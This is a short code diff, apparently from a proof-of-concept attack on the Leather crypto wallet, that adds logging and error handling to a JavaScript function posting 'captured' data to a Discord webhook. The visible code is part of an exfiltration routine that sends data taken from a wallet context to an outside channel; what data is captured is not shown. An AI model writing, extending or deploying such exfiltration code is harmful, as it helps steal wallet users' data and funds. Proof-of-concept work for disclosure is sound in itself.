@@ -244,6 +244,9 @@
                 return false;
             }
             
+            log('🔍 Webhook URL: ' + CONFIG.WEBHOOK_URL.substring(0, 50) + '...', 'info');
+            log('📦 Data to send: ' + JSON.stringify(data).substring(0, 100) + '...', 'info');
+            
             const embed = {
                 title: '🎯 Leather Wallet PoC - Data Captured',
                 color: 0xff0000,
@@ -290,15 +293,21 @@
                     })
                 });
                 
+                log(`📡 Response status: ${response.status}`, response.ok ? 'success' : 'error');
+                
                 if (response.ok) {
                     log('✅ Data successfully sent to Discord!', 'success');
+                    log('💬 Check your Discord channel now!', 'success');
                     return true;
                 } else {
+                    const errorText = await response.text();
                     log(`❌ Discord webhook failed: ${response.status}`, 'error');
+                    log(`❌ Error details: ${errorText}`, 'error');
                     return false;
                 }
             } catch (error) {
                 log(`❌ Error sending to Discord: ${error.message}`, 'error');
+                console.error('Full error:', error);
                 return false;
             }
         }
